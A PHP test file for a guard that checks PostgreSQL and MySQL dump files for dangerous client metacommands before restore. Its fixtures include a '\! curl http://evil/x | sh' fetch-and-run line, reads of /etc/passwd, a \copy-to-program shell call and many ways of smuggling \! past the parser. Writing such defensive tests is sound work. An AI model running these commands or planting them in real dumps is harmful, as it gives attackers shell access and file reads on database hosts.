<?php

declare(strict_types=1);

use Devuni\Notifier\Services\Database\SqlDirectiveGuard;

function writeSqlDump(string $content): string
{
    $path = tempnam(sys_get_temp_dir(), 'sqlguard_');
    file_put_contents($path, $content);

    return $path;
}

describe('SqlDirectiveGuard::assertPostgresSafe', function () {
    it('accepts a genuine pg_dump whose COPY data starts with backslash escapes', function () {
        // Real pg_dump plain output: SQL statements + a COPY ... FROM stdin block
        // whose data lines legitimately begin with \t, \N, \\, and end with \.
        $dump = implode("\n", [
            'SET statement_timeout = 0;',
            'CREATE TABLE public.t (id integer, note text);',
            'COPY public.t (id, note) FROM stdin;',
            "1\t\\tindented value",   // second field value starts with an escaped tab
            "\\N\tfirst field is null", // data line that STARTS with a backslash escape
            "3\tback\\\\slash",
            '\.',
            'ALTER TABLE public.t ADD CONSTRAINT t_pkey PRIMARY KEY (id);',
        ])."\n";

        $path = writeSqlDump($dump);

        SqlDirectiveGuard::assertPostgresSafe($path);

        expect(true)->toBeTrue(); // reached only if no exception was thrown

        @unlink($path);
    });

    it('rejects a \\! shell metacommand outside a COPY block', function () {
        $path = writeSqlDump("SELECT 1;\n\\! curl http://evil/x | sh\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    });

    it('rejects \\i include and \\copy file directives', function () {
        foreach (['\\i /etc/passwd', "\\copy t to program 'sh -c id'", '\\o |sh', '\\gexec'] as $directive) {
            $path = writeSqlDump("SELECT 1;\n".$directive."\n");

            expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
                ->toThrow(RuntimeException::class);

            @unlink($path);
        }
    });

    it('does NOT let a \\! smuggled after a COPY block go unnoticed', function () {
        // The block terminates at \. so the metacommand after it must be caught.
        $dump = implode("\n", [
            'COPY public.t (id) FROM stdin;',
            '1',
            '\.',
            '\! id',
        ])."\n";

        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class);

        @unlink($path);
    });

    it('accepts the \\restrict and \\unrestrict lines a current pg_dump writes', function () {
        // Trimmed from real pg_dump 16.15 plain output, made with PostgresDumper's
        // flags. The two directives frame the script; the key is random per dump.
        $key = 'SUcKxjXdfzrRSno7LpLZsOlzfthakYl6UjeOS7WwYeCPkljyJg4WPpdlMrkY8CV';

        $dump = implode("\n", [
            '--',
            '-- PostgreSQL database dump',
            '--',
            '',
            '\restrict '.$key,
            '',
            '-- Dumped from database version 16.15',
            '-- Dumped by pg_dump version 16.15',
            '',
            'SET statement_timeout = 0;',
            'CREATE TABLE public.raw_lines (line text, n integer);',
            'COPY public.raw_lines (line, n) FROM stdin;',
            "\\\\restrict looksLikeADirective\t1",
            "\\\\! not a directive, just data\t2",
            "\\N\t3",
            '\.',
            '',
            '--',
            '-- PostgreSQL database dump complete',
            '--',
            '',
            '\unrestrict '.$key,
            '',
        ])."\n";

        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->not->toThrow(RuntimeException::class);

        @unlink($path);
    });

    it('accepts a well-formed restrict line', function (string $line) {
        $path = writeSqlDump("SELECT 1;\n".$line."\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->not->toThrow(RuntimeException::class);

        @unlink($path);
    })->with([
        'restrict' => ['\restrict abc123'],
        'unrestrict' => ['\unrestrict abc123'],
        'single-character key' => ['\restrict a'],
        '128-character key' => ['\restrict '.str_repeat('a', 128)],
        'indented' => ['  \restrict abc123'],
        'trailing spaces' => ['\restrict abc123  '],
        'CRLF line ending' => ["\\restrict abc123\r"],
    ]);

    it('refuses a restrict line that is not exactly the directive and a key', function (string $line) {
        $path = writeSqlDump("SELECT 1;\n".$line."\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    })->with([
        'restrict without a key' => ['\restrict'],
        'unrestrict without a key' => ['\unrestrict'],
        'trailing space but no key' => ['\restrict '],
        'second metacommand after the key' => ['\restrict abc123 \! id'],
        'second metacommand after the unrestrict key' => ['\unrestrict abc123 \! id'],
        'metacommand glued to the key' => ['\restrict abc123\! id'],
        'metacommand after a bare carriage return' => ["\\restrict abc123\r\\! id"],
        'second argument' => ['\restrict abc123 def456'],
        'semicolon after the key' => ['\restrict abc123;'],
        'quoted key' => ["\\restrict 'abc123'"],
        'variable as the key' => ['\restrict :key'],
        'punctuation in the key' => ['\restrict abc-123'],
        'non-ASCII key' => ['\restrict abč123'],
        '129-character key' => ['\restrict '.str_repeat('a', 129)],
        'tab before the key' => ["\\restrict\tabc123"],
        'two spaces before the key' => ['\restrict  abc123'],
        'no space before the key' => ['\restrictabc123'],
        'upper-case directive' => ['\RESTRICT abc123'],
        'longer directive name' => ['\restricted abc123'],
    ]);

    it('keeps refusing a metacommand on the lines around an allowed restrict line', function (string $dump) {
        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    })->with([
        'before restrict' => ["\\! id\n\\restrict abc123\n"],
        'between restrict and unrestrict' => ["\\restrict abc123\n\\! id\n\\unrestrict abc123\n"],
        'after unrestrict' => ["\\restrict abc123\n\\unrestrict abc123\n\\! id\n"],
    ]);
});

describe('SqlDirectiveGuard::assertPostgresSafe script reading', function () {
    it('accepts text that only looks like a directive', function (string $script) {
        $path = writeSqlDump($script);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->not->toThrow(RuntimeException::class);

        @unlink($path);
    })->with([
        'stored routine' => [implode("\n", [
            'CREATE FUNCTION public.f() RETURNS text',
            '    LANGUAGE plpgsql',
            '    AS $$',
            'BEGIN',
            '  /*',
            '\! echo x',
            '  */',
            "  RETURN 'first",
            '\! echo x',
            "last';",
            'END;',
            '$$;',
            '',
        ])],
        'stored routine with a tagged delimiter' => ["CREATE FUNCTION f() RETURNS text LANGUAGE sql AS \$_\$\n\\i x\n\$\$ \$a\$\n\$_\$;\n"],
        'string' => ["COMMENT ON TABLE t IS 'one\n\\! echo x\ntwo';\n"],
        'escape string' => ["SELECT E'it\\'s\n\\! echo x';\n"],
        'quoted identifier' => ["CREATE TABLE \"a\n\\! echo x\" (b integer);\n"],
        'line comment' => ["-- \\! echo x\nSELECT 1;\n"],
        'nested block comment' => ["/* a /* b */\n\\! echo x\n*/\nSELECT 1;\n"],
        'string with unusual lines' => ["SELECT 'a\n\\.\n';\n"],
        'string followed by a quote on the next line' => ["SELECT 'a'\n'b';\n"],
        'windows line endings' => ["SELECT 1;\r\n-- comment\r\nCOPY public.t (a) FROM stdin;\r\n\\N\r\n\\.\r\nSELECT 2;\r\n"],
        'copy data with unusual lines' => ["COPY t FROM stdin;\n\\.\r\r\n\\. \n a\\.\n\\\\.\n\\.\n"],
        'copy of an awkward relation' => ["COPY public.\"a\"\"b c\" (\"from\", copy, \"x;y\") FROM stdin;\n1\t2\t3\n\\.\n"],
        'copy of a table without columns' => ["COPY public.t  FROM stdin;\n\\.\n"],
        'copy naming the keywords' => ["COPY stdin (copy) FROM stdin;\n\\! echo x\n\\.\n"],
        'routine body with statements' => ["CREATE FUNCTION f(a integer) RETURNS integer\n    LANGUAGE sql\n    BEGIN ATOMIC\n SELECT CASE WHEN a > 0 THEN 1 ELSE 2 END;\n SELECT a;\nEND;\nCOPY public.t (a) FROM stdin;\n1\n\\.\n"],
        'procedure body with statements' => ["CREATE OR REPLACE PROCEDURE p()\n    LANGUAGE sql\n    BEGIN ATOMIC\n SELECT 1;\nEND;\n"],
        'array slice and casts' => ["CREATE VIEW v AS SELECT (a)[1:n], b::text, c[i:j] FROM t;\n"],
        'numbers' => ["SELECT 1, 1.5, .5, 1e3, 1.5e-3, 1E+3, 0;\n"],
        'parameter' => ["CREATE FUNCTION f(integer) RETURNS integer LANGUAGE sql BEGIN ATOMIC SELECT \$1 + 1; END;\n"],
        'bracketed psql text' => ["SELECT :\"a\", :'b', :c;\n"],
        'preamble settings' => ["SET statement_timeout = 0;\nSET client_encoding = 'UTF8';\nSET standard_conforming_strings = on;\nSET client_min_messages = warning;\n"],
        'storage settings' => ["SET default_tablespace = names;\nSET default_tablespace = \"all\";\nSET default_table_access_method = \"names\";\n"],
        'closing a string at the end of input' => ["SELECT 'a';"],
    ]);

    it('refuses a script that reaches the client as a directive', function (string $script) {
        $path = writeSqlDump($script);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    })->with([
        'reading 01' => ["SELECT 1;  \\! echo x\n"],
        'reading 02' => ["/*\nCOPY t FROM stdin;\n*/\n\\! echo x\n"],
        'reading 03' => ["SELECT '\nCOPY t FROM stdin;\n';\n\\! echo x\n"],
        'reading 04' => ["SELECT \$\$\nCOPY t FROM stdin;\n\$\$;\n\\! echo x\n"],
        'reading 05' => ["-- COPY t FROM stdin;\n\\! echo x\n"],
        'reading 06' => ["COPY t FROM stdin; \\! echo x\n\\.\n"],
        'reading 07' => ["COPY t FROM stdin;\n1\n\\.\r\r\n\\.\n\\! echo x\n"],
        'reading 08' => ["COPY t FROM stdin;\n1\n\\.\n\\! echo x\n"],
        'reading 09' => ["-- c\r\\! echo x\n"],
        'reading 10' => ["SELECT :E'a\\' \\! echo x\n--';\n"],
        'reading 11' => ["SELECT E'a'\n'b\\' \\! echo x\n--';\n"],
        'reading 12' => ["SELECT foo\$\$ \\! echo x\n\$\$;\n"],
        'reading 13' => ["SELECT fooE'a\\' \\! echo x\n--';\n"],
        'reading 14' => ["/* /* */ */ \\! echo x\n"],
        'reading 15' => ["SELECT 1 */* c */ \\! echo x\n;\n"],
        'reading 16' => ["SELECT \$a\$ \$b\$ \$a\$ \\! echo x\n;\n"],
        'reading 17' => ["SELECT 1\\; SELECT 2;\n"],
        'reading 18' => ["SELECT 1\n\\restrict abc123\n;\n"],
        'reading 19' => ["/* c */ \\restrict abc123\n"],
        'reading 20' => ["CREATE FUNCTION begin() RETURNS int LANGUAGE sql AS 'select 1';\n\\restrict abc123\n"],
    ]);

    it('refuses a script outside the forms it recognises', function (string $script) {
        $path = writeSqlDump($script);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'cannot be verified');

        @unlink($path);
    })->with([
        'form 01' => ["\xEF\xBB\xBFCOPY t FROM stdin;\n1\n\\.\n"],
        'form 02' => ["SELECT 1 \0 '\n\\! echo x\n--';\n"],
        'form 03' => ["COPY t FROM stdin;\na\0b\n\\.\n"],
        'form 04' => ["SELECT 1;\rSELECT 2;\n"],
        'form 05' => ["SELECT E'a'\r'b';\n"],
        'form 06' => ["-- a\rb\n"],
        'form 07' => ["\x0BSELECT 1;\n"],
        'form 08' => ["SELECT 0x\$\$ \$\$;\n"],
        'form 09' => ["SELECT 1E'a';\n"],
        'form 10' => ["SELECT 1a;\n"],
        'form 11' => ["SELECT \$1a\$\$ \$\$;\n"],
        'form 12' => ["SELECT \$foo;\n"],
        'form 13' => ["COPY t FROM STDOUT;\n1\n\\.\n"],
        'form 14' => ["COPY t FROM stdin WITH (FORMAT csv);\n1\n\\.\n"],
        'form 15' => ["COPY t TO stdout;\n"],
        'form 16' => ["COPY t FROM '/tmp/x';\n"],
        'form 17' => ["COPY BINARY t FROM stdin;\n\\.\n"],
        'form 18' => ["COPY t FROM stdin; -- c\n1\n\\.\n"],
        'form 19' => ["COPY t FROM stdin; SELECT 1;\n1\n\\.\n"],
        'form 20' => ["SELECT (1; COPY t FROM stdin;\n1\n\\.\n"],
        'form 21' => ["CREATE FUNCTION begin() RETURNS int LANGUAGE sql AS 'select 1'; COPY t FROM stdin; SELECT 1 AS end;\n1\n\\.\n"],
        'form 22' => ["SET standard_conforming_strings = off;\n"],
        'form 23' => ["SET LOCAL standard_conforming_strings TO off;\n"],
        'form 24' => ["RESET standard_conforming_strings;\n"],
        'form 25' => ["RESET ALL;\n"],
        'form 26' => ["SET client_encoding = 'SJIS';\n"],
        'form 27' => ["SET NAMES 'BIG5';\n"],
        'form 28' => ["SET \"client_encoding\" = 'GBK';\n"],
        'form 29' => ["SELECT 'open\n"],
        'form 30' => ["SELECT E'open\\'\n"],
        'form 31' => ["SELECT \"open\n"],
        'form 32' => ["SELECT \$\$open\n"],
        'form 33' => ["/* open\n"],
        'form 34' => ["/* a /* b */\n"],
        'form 35' => ["COPY t FROM stdin;\n1\n"],
        'form 36' => ["COPY t FROM stdin;\n1\n\\."],
        'form 37' => ["SELECT 1\n"],
        'form 38' => ["SELECT (1;\n"],
        'form 39' => ["CREATE FUNCTION f() BEGIN ATOMIC SELECT 1;\n"],
        'form 40' => ["SELECT 1\r"],
        'form 41' => ["SET/**/NAMES 'BIG5';\n"],
        'form 42' => ["SET/**/client_encoding = 'SJIS';\n"],
    ]);

    it('keeps reading the same across chunk boundaries', function (string $prefix, string $middle, string $suffix) {
        foreach (range(-8, 2) as $shift) {
            $padding = str_repeat('x', 1_048_576 - mb_strlen($prefix, '8bit') + $shift);
            $accepted = writeSqlDump($prefix.$padding.$middle.$suffix);
            $refused = writeSqlDump($prefix.$padding.$middle.$suffix."\\! echo x\n");

            try {
                expect(fn () => SqlDirectiveGuard::assertPostgresSafe($accepted))
                    ->not->toThrow(RuntimeException::class);

                expect(fn () => SqlDirectiveGuard::assertPostgresSafe($refused))
                    ->toThrow(RuntimeException::class, 'client directive');
            } finally {
                @unlink($accepted);
                @unlink($refused);
            }
        }
    })->with([
        'string' => ["SELECT '", "'';", "';\n"],
        'escape string' => ["SELECT E'", "\\'", "';\n"],
        'quoted identifier' => ['SELECT "', '""', "\";\n"],
        'dollar quote' => ['SELECT $body$', '$body', "\$body\$;\n"],
        'block comment' => ['/*', '***', "*/\n"],
        'line comment' => ['-- ', "\r", "\n"],
        'copy data' => ["COPY t FROM stdin;\n", "\n", "\\.\n"],
        'copy data with windows line endings' => ["COPY t FROM stdin;\r\n", "\r\n", "\\.\r\n"],
    ]);

    it('keeps reading the same when a long delimiter crosses the read window', function (int $size, int $shift) {
        $delimiter = '$'.str_repeat('T', $size - 2).'$';
        $head = 'SELECT '.$delimiter;
        $body = $head.str_repeat('x', 1_048_576 + $shift - mb_strlen($head, '8bit')).$delimiter;

        $accepted = writeSqlDump($body.";\n");
        $refused = writeSqlDump($body." \\! echo x\n-- ".$delimiter.";\n");

        try {
            expect(fn () => SqlDirectiveGuard::assertPostgresSafe($accepted))
                ->not->toThrow(RuntimeException::class);

            expect(fn () => SqlDirectiveGuard::assertPostgresSafe($refused))
                ->toThrow(RuntimeException::class, 'client directive');
        } finally {
            @unlink($accepted);
            @unlink($refused);
        }
    })->with([
        'long 1' => [8193, -8192],
        'long 2' => [9000, -8999],
        'long 3' => [9000, -8500],
        'long 4' => [9000, -8193],
        'long 5' => [20000, -19999],
        'long 6' => [20000, -9000],
        'long 7' => [20000, -8193],
    ]);

    it('takes a copy header wider than a single token', function () {
        $columns = implode(', ', array_map(fn (int $i) => '"column_with_a_fairly_long_name_'.$i.'"', range(1, 1600)));

        $path = writeSqlDump('COPY public.wide ('.$columns.") FROM stdin;\n\\.\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->not->toThrow(RuntimeException::class);

        @unlink($path);
    });

    it('inspects a very long line in constant memory', function () {
        $path = tempnam(sys_get_temp_dir(), 'sqlguard_');

        try {
            $handle = fopen($path, 'wb');
            $block = str_repeat('a', 1_048_576);

            fwrite($handle, "COPY t FROM stdin;\n");

            // Small enough that reading a whole line stays under the default memory_limit,
            // so a regression fails this assertion instead of ending the PHP process.
            for ($i = 0; $i < 24; $i++) {
                fwrite($handle, $block);
            }

            fwrite($handle, "\n\\.\nSELECT '");

            for ($i = 0; $i < 24; $i++) {
                fwrite($handle, $block);
            }

            fwrite($handle, "';\n");
            fclose($handle);
            unset($block);

            $before = memory_get_usage();
            memory_reset_peak_usage();

            SqlDirectiveGuard::assertPostgresSafe($path);

            expect(memory_get_peak_usage() - $before)->toBeLessThan(8 * 1_048_576);
        } finally {
            @unlink($path);
        }
    });
});

describe('SqlDirectiveGuard::assertMysqlSafe', function () {
    it('accepts a genuine mysqldump INSERT dump', function () {
        $dump = implode("\n", [
            '-- MySQL dump 10.13',
            '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;',
            'DROP TABLE IF EXISTS `t`;',
            'CREATE TABLE `t` (`id` int NOT NULL, `note` text);',
            "INSERT INTO `t` VALUES (1,'a back\\\\slash value'),(2,'plain');",
            'UNLOCK TABLES;',
        ])."\n";

        $path = writeSqlDump($dump);

        SqlDirectiveGuard::assertMysqlSafe($path);

        expect(true)->toBeTrue();

        @unlink($path);
    });

    it('rejects \\!, system and source client directives', function () {
        foreach (['\\! id', 'system id', 'source /etc/passwd'] as $directive) {
            $path = writeSqlDump("SELECT 1;\n".$directive."\n");

            expect(fn () => SqlDirectiveGuard::assertMysqlSafe($path))
                ->toThrow(RuntimeException::class);

            @unlink($path);
        }
    });

    it('does not extend the pg_dump restrict allowance to the mysql client', function () {
        $path = writeSqlDump("SELECT 1;\n\\restrict abc123\n");

        expect(fn () => SqlDirectiveGuard::assertMysqlSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    });
});
